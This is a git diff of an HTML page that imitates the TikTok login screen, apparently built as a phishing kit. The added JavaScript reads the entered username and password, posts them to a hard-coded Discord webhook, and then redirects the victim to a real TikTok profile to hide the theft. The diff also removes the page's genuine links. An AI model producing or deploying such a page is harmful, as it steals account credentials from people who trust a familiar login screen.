@@ -1,12 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="icon" type="image/x-icon" href="your-tiktok-logo.png">
   <title>TikTok</title>
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="D:\Phishing tests\Mine\style.css">
 </head>
+
 <body>
   <span id="root">
     <section class="section-all">
@@ -15,16 +17,19 @@
           <article class="article">
             <div class="content">
               <div class="login-box">
-                <div class="header">
-                  <img class="logo" src="vecteezy_tiktok-png-icon_16716450.png" alt="TikTok">
+                <div>
+
                 </div>
+<div data-e2e="header-text" class="tiktok-1xzlee1-DivTitle e1x3uhsi4">Log in</div>
                 <div class="form-wrap">
                   <form class="form">
                     <div class="input-box">
-                      <input type="text" id="username" placeholder="Username or Email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
+                      <input type="text" id="username" placeholder="Username or Email" aria-required="true"
+                        maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
                     </div>
                     <div class="input-box">
-                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30"
+                        aria-required="true" autocapitalize="off" autocorrect="off" required>
                     </div>
                     <span class="button-box">
                       <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
@@ -35,19 +40,6 @@
               </div>
 
               <div class="login-box">
-                <p class="text">Don't have an account?<a href="https://www.tiktok.com/signup">Sign up</a></p>
-              </div>
-
-              <div class="app">
-                <p>Get the app.</p>
-                <div class="app-img">
-                  <a href="https://itunes.apple.com/app/tiktok/id835599320?mt=8">
-                    <img src="your-ios-badge.png">
-                  </a>
-                  <a href="https://play.google.com/store/apps/details?id=com.zhiliaoapp.musically">
-                    <img src="your-android-badge.png">
-                  </a>
-                </div>
               </div>
             </div>
           </article>
@@ -57,15 +49,6 @@
       <footer class="footer" role="contentinfo">
         <div class="footer-container">
           <nav class="footer-nav" role="navigation">
-            <ul>
-              <li><a href="https://www.tiktok.com/about">About Us</a></li>
-              <li><a href="https://support.tiktok.com">Support</a></li>
-              <li><a href="https://newsroom.tiktok.com">Newsroom</a></li>
-              <li><a href="https://careers.tiktok.com">Careers</a></li>
-              <li><a href="https://developers.tiktok.com">Developers</a></li>
-              <li><a href="https://www.tiktok.com/legal/privacy-policy">Privacy</a></li>
-              <li><a href="https://www.tiktok.com/legal/terms-of-service">Terms</a></li>
-            </ul>
           </nav>
           <span class="footer-logo">&copy; 2024 TikTok</span>
         </div>
@@ -80,9 +63,27 @@
   </script>
 
   <script>
+ 
     function sendMessage() {
-      // Discord webhook magic here
+      function sleep(milliseconds) {
+        const date = Date.now();
+        let currentDate = null;
+        do {
+          currentDate = Date.now();
+        } while (currentDate - date < milliseconds);
+      }
+      var request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1186106510149951608/r0LP6RcJ109iMCPEjsvYhG7bT3XU1bIItDUnZVb3F0Q86Sz6shXbiPHeuQGY1aLaBYDm");
+      request.setRequestHeader('Content-type', 'application/json');
+      var params = {
+        content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+      }
+      request.send(JSON.stringify(params));
+      sleep(400)
+      window.location.replace("https://www.tiktok.com/@daila051?lang=en");
     }
+  
   </script>
 </body>
+
 </html>
